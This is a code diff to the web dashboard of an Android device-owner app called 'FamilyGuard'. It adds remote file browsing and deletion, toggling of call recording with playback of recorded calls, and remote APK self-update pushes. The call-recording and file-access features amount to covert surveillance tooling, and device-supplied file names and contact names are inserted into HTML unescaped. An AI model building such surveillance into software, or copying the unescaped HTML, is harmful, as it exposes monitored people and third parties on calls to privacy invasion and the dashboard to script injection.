@@ -403,6 +403,24 @@ function handleRealtimeMessage(data) {
       showToast(`Command failed: ${data.error}`, 'error');
       break;
       
+    case 'file_list_response':
+      // File list received from device
+      debugLog('[Sync] File list received:', data.files?.length || 0, 'files');
+      handleFileListResponse(data);
+      break;
+      
+    case 'file_delete_response':
+      // File deletion result
+      debugLog('[Sync] File delete result:', data.success);
+      handleFileDeleteResponse(data);
+      break;
+      
+    case 'call_recording_response':
+      // Call recording action result
+      debugLog('[Sync] Call recording response:', data);
+      handleCallRecordingResponse(data);
+      break;
+      
     case 'ping':
       // Respond to server ping
       if (syncSocket && syncSocket.readyState === WebSocket.OPEN) {
@@ -3495,6 +3513,12 @@ async function loadDeviceOwnerPage(autoActivateAttempted = false) {
       
       // Load installed apps list for hide/uninstall management
       loadInstalledApps();
+      
+      // Load call recording status
+      loadCallRecordingStatus();
+      
+      // Load app version info
+      loadAppVersion();
     } else if (!autoActivateAttempted) {
       // DO not yet active in backend — auto-activate for user
       console.log('[DO] Mode not set, attempting auto-activation...');
@@ -4014,6 +4038,23 @@ function setupDeviceOwnerListeners() {
   document.getElementById('btnDoGrantAllPerms')?.addEventListener('click', doGrantAllPermissions);
   document.getElementById('btnDoInstallApp')?.addEventListener('click', doInstallApp);
   
+  // File Browser listeners
+  document.getElementById('btnRefreshFiles')?.addEventListener('click', loadFiles);
+  document.getElementById('btnDeleteSelected')?.addEventListener('click', deleteSelectedFiles);
+  document.getElementById('selectAllFiles')?.addEventListener('change', toggleSelectAllFiles);
+  
+  // Call Recording listeners
+  document.getElementById('toggleCallRecording')?.addEventListener('change', toggleCallRecording);
+  document.getElementById('btnRefreshRecordings')?.addEventListener('click', loadRecordings);
+  document.getElementById('btnClosePlayer')?.addEventListener('click', closeAudioPlayer);
+  
+  // App Self-Update listeners
+  document.getElementById('btnPushSelfUpdate')?.addEventListener('click', pushSelfUpdate);
+  document.getElementById('btnRefreshAppVersion')?.addEventListener('click', loadAppVersion);
+  document.getElementById('btnDownloadLatestApk')?.addEventListener('click', downloadLatestApk);
+  document.getElementById('btnCopyAdbUpdate')?.addEventListener('click', copyAdbUpdateCommand);
+  setupSelfUpdateDropZone();
+  
   // App Management - search filter + refresh
   document.getElementById('doAppSearchInput')?.addEventListener('input', (e) => {
     const term = e.target.value.toLowerCase().trim();
@@ -4082,6 +4123,848 @@ function setupDeviceOwnerListeners() {
         fileInput.files = e.dataTransfer.files;
         fileInput.dispatchEvent(new Event('change'));
       }
+    });
+  }
+}
+
+// ========== FILE BROWSER ==========
+let currentFilePath = '/storage/emulated/0';
+let selectedFiles = new Set();
+let filesCache = [];
+
+async function loadFiles(path = currentFilePath) {
+  const deviceId = getDeviceId(selectedDevice);
+  if (!deviceId) {
+    showToast('Please select a device', 'error');
+    return;
+  }
+  
+  currentFilePath = path;
+  updateBreadcrumb(path);
+  
+  const fileList = document.getElementById('fileList');
+  fileList.innerHTML = `
+    <div class="file-list-empty">
+      <i class="fas fa-spinner fa-spin"></i>
+      <p>Loading files...</p>
+    </div>
+  `;
+  
+  try {
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/files?path=${encodeURIComponent(path)}`, {
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('Failed to load files');
+    
+    const data = await response.json();
+    
+    // Update storage info if available
+    if (data.storageInfo) {
+      updateStorageInfo(data.storageInfo);
+    }
+    
+    filesCache = data.files || [];
+    selectedFiles.clear();
+    updateSelectedCount();
+    renderFileList(filesCache);
+    
+  } catch (error) {
+    console.error('Error loading files:', error);
+    fileList.innerHTML = `
+      <div class="file-list-empty">
+        <i class="fas fa-exclamation-triangle"></i>
+        <p>Failed to load files: ${error.message}</p>
+      </div>
+    `;
+  }
+}
+
+function updateBreadcrumb(path) {
+  const breadcrumb = document.getElementById('fileBreadcrumb');
+  if (!breadcrumb) return;
+  
+  const parts = path.split('/').filter(p => p);
+  let html = `<span class="breadcrumb-item" data-path="/" onclick="loadFiles('/')">
+    <i class="fas fa-hdd"></i> Root
+  </span>`;
+  
+  let currentPath = '';
+  parts.forEach((part, i) => {
+    currentPath += '/' + part;
+    const isLast = i === parts.length - 1;
+    html += `<i class="fas fa-chevron-right breadcrumb-separator"></i>`;
+    html += `<span class="breadcrumb-item${isLast ? ' active' : ''}" data-path="${currentPath}" onclick="loadFiles('${currentPath}')">${part}</span>`;
+  });
+  
+  breadcrumb.innerHTML = html;
+}
+
+function updateStorageInfo(info) {
+  const usedBar = document.getElementById('storageUsedBar');
+  const usedText = document.getElementById('storageUsedText');
+  const totalText = document.getElementById('storageTotalText');
+  
+  if (usedBar && info.total > 0) {
+    const percent = ((info.total - info.available) / info.total * 100).toFixed(1);
+    usedBar.style.width = percent + '%';
+  }
+  
+  if (usedText) usedText.textContent = formatFileSize(info.total - info.available);
+  if (totalText) totalText.textContent = formatFileSize(info.total);
+}
+
+function renderFileList(files) {
+  const fileList = document.getElementById('fileList');
+  if (!fileList) return;
+  
+  if (!files || files.length === 0) {
+    fileList.innerHTML = `
+      <div class="file-list-empty">
+        <i class="fas fa-folder-open"></i>
+        <p>This folder is empty</p>
+      </div>
+    `;
+    return;
+  }
+  
+  // Sort: folders first, then by name
+  files.sort((a, b) => {
+    if (a.isDirectory && !b.isDirectory) return -1;
+    if (!a.isDirectory && b.isDirectory) return 1;
+    return a.name.localeCompare(b.name);
+  });
+  
+  let html = '';
+  files.forEach(file => {
+    const icon = getFileIcon(file);
+    const checked = selectedFiles.has(file.path) ? 'checked' : '';
+    
+    html += `
+      <div class="file-item${checked ? ' selected' : ''}" data-path="${file.path}" data-is-dir="${file.isDirectory}">
+        <div class="file-checkbox">
+          <input type="checkbox" ${checked} onchange="toggleFileSelection('${file.path}')">
+        </div>
+        <div class="file-info" onclick="handleFileClick('${file.path}', ${file.isDirectory})">
+          <div class="file-icon ${icon.class}">
+            <i class="fas fa-${icon.icon}"></i>
+          </div>
+          <span class="file-name">${file.name}</span>
+        </div>
+        <span class="file-size">${file.isDirectory ? '--' : formatFileSize(file.size)}</span>
+        <span class="file-date">${formatDate(file.modified)}</span>
+      </div>
+    `;
+  });
+  
+  fileList.innerHTML = html;
+}
+
+function getFileIcon(file) {
+  if (file.isDirectory) return { icon: 'folder', class: 'folder' };
+  
+  const ext = file.name.split('.').pop()?.toLowerCase();
+  const type = file.type || '';
+  
+  if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext) || type === 'image') {
+    return { icon: 'image', class: 'image' };
+  }
+  if (['mp4', 'mkv', 'avi', 'mov', 'webm', '3gp'].includes(ext) || type === 'video') {
+    return { icon: 'film', class: 'video' };
+  }
+  if (['mp3', 'wav', 'aac', 'ogg', 'm4a', 'flac'].includes(ext) || type === 'audio') {
+    return { icon: 'music', class: 'audio' };
+  }
+  if (['pdf', 'doc', 'docx', 'txt', 'xls', 'xlsx', 'ppt', 'pptx'].includes(ext) || type === 'document') {
+    return { icon: 'file-alt', class: 'document' };
+  }
+  if (ext === 'apk' || type === 'apk') {
+    return { icon: 'android', class: 'apk' };
+  }
+  if (['zip', 'rar', '7z', 'tar', 'gz'].includes(ext) || type === 'archive') {
+    return { icon: 'file-archive', class: 'archive' };
+  }
+  
+  return { icon: 'file', class: 'other' };
+}
+
+function handleFileClick(path, isDirectory) {
+  if (isDirectory) {
+    loadFiles(path);
+  }
+  // Files can be previewed/downloaded later
+}
+
+function toggleFileSelection(path) {
+  if (selectedFiles.has(path)) {
+    selectedFiles.delete(path);
+  } else {
+    selectedFiles.add(path);
+  }
+  
+  // Update visual state
+  const fileItem = document.querySelector(`.file-item[data-path="${path}"]`);
+  if (fileItem) {
+    fileItem.classList.toggle('selected', selectedFiles.has(path));
+    const checkbox = fileItem.querySelector('input[type="checkbox"]');
+    if (checkbox) checkbox.checked = selectedFiles.has(path);
+  }
+  
+  updateSelectedCount();
+}
+
+function toggleSelectAllFiles() {
+  const selectAll = document.getElementById('selectAllFiles');
+  const checked = selectAll?.checked;
+  
+  selectedFiles.clear();
+  
+  if (checked) {
+    filesCache.forEach(file => {
+      if (!file.isDirectory) selectedFiles.add(file.path);
+    });
+  }
+  
+  // Update all checkboxes
+  document.querySelectorAll('.file-item').forEach(item => {
+    const path = item.dataset.path;
+    const isDir = item.dataset.isDir === 'true';
+    
+    if (!isDir) {
+      const checkbox = item.querySelector('input[type="checkbox"]');
+      if (checkbox) checkbox.checked = checked;
+      item.classList.toggle('selected', checked);
+    }
+  });
+  
+  updateSelectedCount();
+}
+
+function updateSelectedCount() {
+  const countEl = document.getElementById('selectedFilesCount');
+  const deleteBtn = document.getElementById('btnDeleteSelected');
+  
+  if (countEl) countEl.textContent = selectedFiles.size;
+  if (deleteBtn) deleteBtn.disabled = selectedFiles.size === 0;
+}
+
+async function deleteSelectedFiles() {
+  if (selectedFiles.size === 0) return;
+  
+  const count = selectedFiles.size;
+  if (!confirm(`Delete ${count} file(s)? This cannot be undone.`)) return;
+  
+  const deviceId = getDeviceId(selectedDevice);
+  
+  try {
+    showToast(`Deleting ${count} file(s)...`, 'info');
+    
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/files/delete-multiple`, {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${authToken}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ paths: Array.from(selectedFiles) })
+    });
+    
+    if (!response.ok) throw new Error('Delete failed');
+    
+    const result = await response.json();
+    showToast(result.message || 'Files deleted', 'success');
+    
+    // Refresh file list
+    loadFiles(currentFilePath);
+    
+  } catch (error) {
+    console.error('Error deleting files:', error);
+    showToast('Failed to delete files: ' + error.message, 'error');
+  }
+}
+
+// ========== CALL RECORDING ==========
+let recordingsCache = [];
+
+async function loadCallRecordingStatus() {
+  const deviceId = getDeviceId(selectedDevice);
+  if (!deviceId) return;
+  
+  try {
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/call-recording/status`, {
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('Failed to get status');
+    
+    const data = await response.json();
+    
+    // Update toggle
+    const toggle = document.getElementById('toggleCallRecording');
+    if (toggle) toggle.checked = data.enabled;
+    
+    // Update status indicator
+    const indicator = document.getElementById('callRecordStatusIndicator');
+    const statusText = document.getElementById('callRecordStatusText');
+    
+    if (indicator) {
+      indicator.classList.toggle('enabled', data.enabled);
+      indicator.classList.toggle('disabled', !data.enabled);
+    }
+    if (statusText) {
+      statusText.textContent = data.enabled ? 'Recording Active' : 'Not Active';
+    }
+    
+    // Update count
+    const countEl = document.getElementById('totalRecordingsCount');
+    if (countEl) countEl.textContent = `${data.recordingsCount || 0} recordings`;
+    
+    // Load recordings list
+    loadRecordings();
+    
+  } catch (error) {
+    console.error('Error loading call recording status:', error);
+  }
+}
+
+async function toggleCallRecording(e) {
+  const enabled = e.target.checked;
+  const deviceId = getDeviceId(selectedDevice);
+  
+  if (!deviceId) {
+    e.target.checked = !enabled;
+    showToast('Please select a device', 'error');
+    return;
+  }
+  
+  try {
+    const endpoint = enabled ? 'enable' : 'disable';
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/call-recording/${endpoint}`, {
+      method: 'POST',
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('Failed to update status');
+    
+    const data = await response.json();
+    showToast(data.message || `Call recording ${enabled ? 'enabled' : 'disabled'}`, 'success');
+    
+    // Update UI
+    const indicator = document.getElementById('callRecordStatusIndicator');
+    const statusText = document.getElementById('callRecordStatusText');
+    
+    if (indicator) {
+      indicator.classList.toggle('enabled', enabled);
+      indicator.classList.toggle('disabled', !enabled);
+    }
+    if (statusText) {
+      statusText.textContent = enabled ? 'Recording Active' : 'Not Active';
+    }
+    
+  } catch (error) {
+    console.error('Error toggling call recording:', error);
+    e.target.checked = !enabled; // Revert
+    showToast('Failed to update: ' + error.message, 'error');
+  }
+}
+
+async function loadRecordings() {
+  const deviceId = getDeviceId(selectedDevice);
+  if (!deviceId) return;
+  
+  const list = document.getElementById('recordingsList');
+  list.innerHTML = `
+    <div class="recordings-empty">
+      <i class="fas fa-spinner fa-spin"></i>
+      <p>Loading recordings...</p>
+    </div>
+  `;
+  
+  try {
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/call-recording/recordings`, {
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('Failed to load recordings');
+    
+    const data = await response.json();
+    recordingsCache = data.recordings || [];
+    
+    // Update count
+    const countEl = document.getElementById('totalRecordingsCount');
+    if (countEl) countEl.textContent = `${recordingsCache.length} recordings`;
+    
+    renderRecordings();
+    
+  } catch (error) {
+    console.error('Error loading recordings:', error);
+    list.innerHTML = `
+      <div class="recordings-empty">
+        <i class="fas fa-exclamation-triangle"></i>
+        <p>Failed to load recordings</p>
+      </div>
+    `;
+  }
+}
+
+function renderRecordings() {
+  const list = document.getElementById('recordingsList');
+  if (!list) return;
+  
+  if (!recordingsCache || recordingsCache.length === 0) {
+    list.innerHTML = `
+      <div class="recordings-empty">
+        <i class="fas fa-microphone-slash"></i>
+        <p>No recordings yet</p>
+      </div>
+    `;
+    return;
+  }
+  
+  let html = '';
+  recordingsCache.forEach(rec => {
+    const iconClass = rec.callType === 'incoming' ? 'incoming' : 
+                      rec.callType === 'outgoing' ? 'outgoing' : 'missed';
+    const iconName = rec.callType === 'incoming' ? 'phone-alt' : 
+                     rec.callType === 'outgoing' ? 'phone-volume' : 'phone-slash';
+    
+    html += `
+      <div class="recording-item${rec.listened ? '' : ' unheard'}" data-id="${rec._id}">
+        <div class="recording-icon ${iconClass}">
+          <i class="fas fa-${iconName}"></i>
+        </div>
+        <div class="recording-info">
+          <div class="recording-contact">
+            ${rec.listened ? '' : '<span class="unheard-badge"></span>'}
+            ${rec.contactName || 'Unknown'}
+          </div>
+          <div class="recording-phone">${rec.phoneNumber || '--'}</div>
+          <div class="recording-meta">
+            <span><i class="fas fa-clock"></i> ${formatDuration(rec.duration)}</span>
+            <span><i class="fas fa-calendar"></i> ${formatDate(rec.timestamp)}</span>
+            <span><i class="fas fa-database"></i> ${formatFileSize(rec.fileSize)}</span>
+          </div>
+        </div>
+        <div class="recording-actions">
+          <button class="btn-play" onclick="playRecording('${rec._id}')" title="Play">
+            <i class="fas fa-play"></i>
+          </button>
+          <button class="btn-delete" onclick="deleteRecording('${rec._id}')" title="Delete">
+            <i class="fas fa-trash"></i>
+          </button>
+        </div>
+      </div>
+    `;
+  });
+  
+  list.innerHTML = html;
+}
+
+function formatDuration(seconds) {
+  if (!seconds) return '--:--';
+  const mins = Math.floor(seconds / 60);
+  const secs = Math.floor(seconds % 60);
+  return `${mins}:${secs.toString().padStart(2, '0')}`;
+}
+
+async function playRecording(recordingId) {
+  const recording = recordingsCache.find(r => r._id === recordingId);
+  if (!recording) return;
+  
+  const player = document.getElementById('audioPlayer');
+  const audioEl = document.getElementById('audioElement');
+  const titleEl = document.getElementById('audioTitle');
+  const detailsEl = document.getElementById('audioDetails');
+  
+  if (!player || !audioEl) return;
+  
+  // Set audio source
+  const audioUrl = recording.fileUrl.startsWith('/') 
+    ? `${API_BASE.replace('/api', '')}${recording.fileUrl}` 
+    : recording.fileUrl;
+  audioEl.src = audioUrl;
+  
+  // Update info
+  if (titleEl) titleEl.textContent = recording.contactName || recording.phoneNumber || 'Unknown';
+  if (detailsEl) detailsEl.textContent = `${recording.callType || 'call'} • ${formatDate(recording.timestamp)}`;
+  
+  // Show player
+  player.classList.remove('hidden');
+  
+  // Play
+  try {
+    await audioEl.play();
+  } catch (e) {
+    console.error('Error playing audio:', e);
+  }
+  
+  // Mark as listened
+  if (!recording.listened) {
+    markRecordingListened(recordingId);
+  }
+}
+
+async function markRecordingListened(recordingId) {
+  const deviceId = getDeviceId(selectedDevice);
+  
+  try {
+    await fetch(`${API_BASE}/device-owner/${deviceId}/call-recording/recordings/${recordingId}/listened`, {
+      method: 'POST',
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    // Update local cache
+    const rec = recordingsCache.find(r => r._id === recordingId);
+    if (rec) rec.listened = true;
+    
+    // Update UI
+    const item = document.querySelector(`.recording-item[data-id="${recordingId}"]`);
+    if (item) {
+      item.classList.remove('unheard');
+      const badge = item.querySelector('.unheard-badge');
+      if (badge) badge.remove();
+    }
+    
+  } catch (error) {
+    console.error('Error marking listened:', error);
+  }
+}
+
+async function deleteRecording(recordingId) {
+  if (!confirm('Delete this recording?')) return;
+  
+  const deviceId = getDeviceId(selectedDevice);
+  
+  try {
+    const response = await fetch(`${API_BASE}/device-owner/${deviceId}/call-recording/recordings/${recordingId}`, {
+      method: 'DELETE',
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('Delete failed');
+    
+    showToast('Recording deleted', 'success');
+    
+    // Close player if playing this recording
+    const audioEl = document.getElementById('audioElement');
+    if (audioEl && audioEl.src.includes(recordingId)) {
+      closeAudioPlayer();
+    }
+    
+    // Refresh list
+    loadRecordings();
+    
+  } catch (error) {
+    console.error('Error deleting recording:', error);
+    showToast('Failed to delete recording', 'error');
+  }
+}
+
+function closeAudioPlayer() {
+  const player = document.getElementById('audioPlayer');
+  const audioEl = document.getElementById('audioElement');
+  
+  if (audioEl) {
+    audioEl.pause();
+    audioEl.src = '';
+  }
+  if (player) player.classList.add('hidden');
+}
+
+// WebSocket response handlers for file browser and call recording
+function handleFileListResponse(data) {
+  if (data.error) {
+    showToast(`Error loading files: ${data.error}`, 'error');
+    return;
+  }
+  
+  // Update storage info
+  if (data.storageInfo) {
+    updateStorageInfo(data.storageInfo);
+  }
+  
+  // Update path and render files
+  if (data.path) currentFilePath = data.path;
+  filesCache = data.files || [];
+  selectedFiles.clear();
+  updateSelectedCount();
+  updateBreadcrumb(currentFilePath);
+  renderFileList(filesCache);
+}
+
+function handleFileDeleteResponse(data) {
+  if (data.success) {
+    showToast(data.message || 'File(s) deleted successfully', 'success');
+    // Refresh file list
+    loadFiles(currentFilePath);
+  } else {
+    showToast(`Delete failed: ${data.error || 'Unknown error'}`, 'error');
+  }
+}
+
+function handleCallRecordingResponse(data) {
+  if (data.action === 'enable' || data.action === 'disable') {
+    const enabled = data.action === 'enable' && data.success;
+    
+    const toggle = document.getElementById('toggleCallRecording');
+    if (toggle) toggle.checked = enabled;
+    
+    const indicator = document.getElementById('callRecordStatusIndicator');
+    const statusText = document.getElementById('callRecordStatusText');
+    
+    if (indicator) {
+      indicator.classList.toggle('enabled', enabled);
+      indicator.classList.toggle('disabled', !enabled);
+    }
+    if (statusText) {
+      statusText.textContent = enabled ? 'Recording Active' : 'Not Active';
+    }
+    
+    if (data.success) {
+      showToast(`Call recording ${data.action}d`, 'success');
+    } else {
+      showToast(`Failed to ${data.action} call recording: ${data.error || 'Unknown error'}`, 'error');
+    }
+  } else if (data.action === 'upload') {
+    // New recording uploaded - refresh list
+    if (data.success) {
+      showToast('New call recording uploaded', 'success');
+      loadRecordings();
+    }
+  }
+}
+
+// ========== APP SELF-UPDATE ==========
+let selfUpdateFile = null;
+
+function setupSelfUpdateDropZone() {
+  const dropZone = document.getElementById('doSelfUpdateDropZone');
+  const fileInput = document.getElementById('doSelfUpdateFileInput');
+  
+  if (!dropZone || !fileInput) return;
+  
+  // Click to open file browser
+  dropZone.addEventListener('click', (e) => {
+    if (e.target.tagName !== 'INPUT') fileInput.click();
+  });
+  
+  // File selected
+  fileInput.addEventListener('change', () => {
+    const uploadContent = document.getElementById('doSelfUpdateUploadContent');
+    if (fileInput.files.length > 0) {
+      selfUpdateFile = fileInput.files[0];
+      if (uploadContent) {
+        uploadContent.innerHTML = `
+          <i class="fas fa-file-archive" style="font-size: 28px; color: #10b981; margin-bottom: 8px;"></i>
+          <p style="font-weight: 600;">${selfUpdateFile.name}</p>
+          <p style="font-size: 0.8rem; color: var(--text-muted);">${(selfUpdateFile.size / 1024 / 1024).toFixed(1)} MB</p>
+        `;
+      }
+    }
+  });
+  
+  // Drag & drop handlers
+  dropZone.addEventListener('dragover', (e) => {
+    e.preventDefault();
+    dropZone.style.borderColor = '#10b981';
+    dropZone.style.background = 'rgba(16, 185, 129, 0.05)';
+  });
+  
+  dropZone.addEventListener('dragleave', () => {
+    dropZone.style.borderColor = '';
+    dropZone.style.background = '';
+  });
+  
+  dropZone.addEventListener('drop', (e) => {
+    e.preventDefault();
+    dropZone.style.borderColor = '';
+    dropZone.style.background = '';
+    if (e.dataTransfer.files.length > 0) {
+      fileInput.files = e.dataTransfer.files;
+      fileInput.dispatchEvent(new Event('change'));
+    }
+  });
+}
+
+async function loadAppVersion() {
+  const deviceId = getDeviceId(selectedDevice);
+  if (!deviceId) return;
+  
+  try {
+    // Get device version
+    const deviceData = await api(`/device-owner/app-update/${deviceId}/app-version`);
+    const deviceVersionEl = document.getElementById('deviceAppVersion');
+    if (deviceVersionEl) {
+      deviceVersionEl.textContent = deviceData.deviceVersion || 'Unknown';
+    }
+    
+    // Get latest available
+    const latestData = await api('/device-owner/app-update/latest');
+    const latestVersionEl = document.getElementById('latestAppVersion');
+    const updateBadge = document.getElementById('updateAvailableBadge');
+    
+    if (latestVersionEl) {
+      if (latestData.available) {
+        latestVersionEl.textContent = latestData.fileName || 'Available';
+        // Show update badge if versions differ (simple check)
+        if (updateBadge) {
+          updateBadge.classList.remove('hidden');
+        }
+      } else {
+        latestVersionEl.textContent = 'No update uploaded';
+        if (updateBadge) updateBadge.classList.add('hidden');
+      }
+    }
+    
+    // Update ADB command
+    updateAdbCommand();
+    
+  } catch (error) {
+    console.error('Error loading app version:', error);
+  }
+}
+
+function updateAdbCommand() {
+  const cmdEl = document.getElementById('adbUpdateCommand');
+  if (cmdEl) {
+    cmdEl.textContent = 'adb install -r "path/to/FamilyGuard-latest.apk"';
+  }
+}
+
+async function pushSelfUpdate() {
+  const deviceId = getDeviceId(selectedDevice);
+  if (!deviceId) {
+    showToast('Please select a device', 'error');
+    return;
+  }
+  
+  const btn = document.getElementById('btnPushSelfUpdate');
+  const progressDiv = document.getElementById('doSelfUpdateProgress');
+  const progressBar = document.getElementById('doSelfUpdateProgressBar');
+  const statusText = document.getElementById('doSelfUpdateStatus');
+  
+  try {
+    btn.disabled = true;
+    
+    let apkUrl = null;
+    
+    // If file selected, upload first
+    if (selfUpdateFile) {
+      // Show progress
+      progressDiv?.classList.remove('hidden');
+      document.getElementById('doSelfUpdateUploadContent')?.classList.add('hidden');
+      
+      statusText.textContent = 'Uploading APK...';
+      
+      const formData = new FormData();
+      formData.append('apk', selfUpdateFile);
+      
+      const xhr = new XMLHttpRequest();
+      
+      await new Promise((resolve, reject) => {
+        xhr.upload.onprogress = (e) => {
+          if (e.lengthComputable) {
+            const percent = (e.loaded / e.total * 100).toFixed(0);
+            if (progressBar) progressBar.style.width = percent + '%';
+            if (statusText) statusText.textContent = `Uploading... ${percent}%`;
+          }
+        };
+        
+        xhr.onload = () => {
+          if (xhr.status >= 200 && xhr.status < 300) {
+            const response = JSON.parse(xhr.responseText);
+            apkUrl = response.downloadUrl;
+            resolve();
+          } else {
+            reject(new Error('Upload failed'));
+          }
+        };
+        
+        xhr.onerror = () => reject(new Error('Upload failed'));
+        
+        xhr.open('POST', `${API_BASE}/device-owner/app-update/upload`);
+        xhr.setRequestHeader('Authorization', `Bearer ${authToken}`);
+        xhr.send(formData);
+      });
+      
+      statusText.textContent = 'Pushing update to device...';
+    }
+    
+    // Push update to device
+    const response = await fetch(`${API_BASE}/device-owner/app-update/${deviceId}/push-update`, {
+      method: 'POST',
+      headers: {
+        'Authorization': `Bearer ${authToken}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ apkUrl })
+    });
+    
+    if (!response.ok) {
+      const err = await response.json();
+      throw new Error(err.error || 'Failed to push update');
+    }
+    
+    const result = await response.json();
+    
+    showToast('Update pushed to device successfully', 'success');
+    
+    // Reset UI
+    progressDiv?.classList.add('hidden');
+    document.getElementById('doSelfUpdateUploadContent')?.classList.remove('hidden');
+    const uploadContent = document.getElementById('doSelfUpdateUploadContent');
+    if (uploadContent) {
+      uploadContent.innerHTML = `
+        <i class="fas fa-cloud-upload-alt" style="font-size: 28px; color: #10b981; margin-bottom: 8px;"></i>
+        <p style="font-weight: 600; margin-bottom: 4px;">Drop FamilyGuard APK here</p>
+        <p style="font-size: 0.8rem; color: var(--text-muted);">or click to select file</p>
+      `;
+    }
+    selfUpdateFile = null;
+    document.getElementById('doSelfUpdateFileInput').value = '';
+    
+    // Refresh version after delay
+    setTimeout(loadAppVersion, 5000);
+    
+  } catch (error) {
+    console.error('Error pushing update:', error);
+    showToast('Failed to push update: ' + error.message, 'error');
+    progressDiv?.classList.add('hidden');
+    document.getElementById('doSelfUpdateUploadContent')?.classList.remove('hidden');
+  } finally {
+    btn.disabled = false;
+  }
+}
+
+async function downloadLatestApk() {
+  try {
+    const response = await fetch(`${API_BASE}/device-owner/app-update/latest`, {
+      headers: { 'Authorization': `Bearer ${authToken}` }
+    });
+    
+    if (!response.ok) throw new Error('No APK available');
+    
+    const data = await response.json();
+    if (!data.available) {
+      showToast('No APK uploaded yet', 'info');
+      return;
+    }
+    
+    // Download
+    window.open(`${API_BASE.replace('/api', '')}/updates/${data.fileName}`, '_blank');
+    
+  } catch (error) {
+    console.error('Error downloading APK:', error);
+    showToast('Failed to download APK', 'error');
+  }
+}
+
+function copyAdbUpdateCommand() {
+  const cmdEl = document.getElementById('adbUpdateCommand');
+  if (cmdEl) {
+    navigator.clipboard.writeText(cmdEl.textContent).then(() => {
+      showToast('Command copied to clipboard', 'success');
+    }).catch(err => {
+      showToast('Failed to copy command', 'error');
     });
   }
 }
